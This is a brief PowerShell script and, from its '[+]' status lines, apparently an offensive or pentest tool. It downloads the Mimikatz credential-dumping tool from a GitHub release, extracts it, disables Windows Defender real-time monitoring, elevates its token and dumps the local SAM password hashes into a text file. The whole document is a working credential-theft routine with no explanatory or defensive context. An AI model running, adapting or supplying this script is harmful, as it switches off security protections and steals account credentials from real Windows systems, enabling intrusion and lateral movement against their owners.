$url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200715/mimikatz_trunk.zip"

$output = "$PSScriptRoot\mimikatz.zip"

Invoke-WebRequest -Uri $url -OutFile $output

Expand-Archive .\mimikatz.zip
Write-Output "[+] Mimikatz downloaded and extracted"

Set-MpPreference -DisableRealTimeMonitoring $true
Write-Output "[+] Disabled Windows Defender"

Write-Output "[+] Pulling down hashes"
cd .\mimikatz\x64

.\mimikatz.exe token::elevate lsadump::sam exit >> hashes.txt
mv hashes.txt ..\..\..\hashes.txt


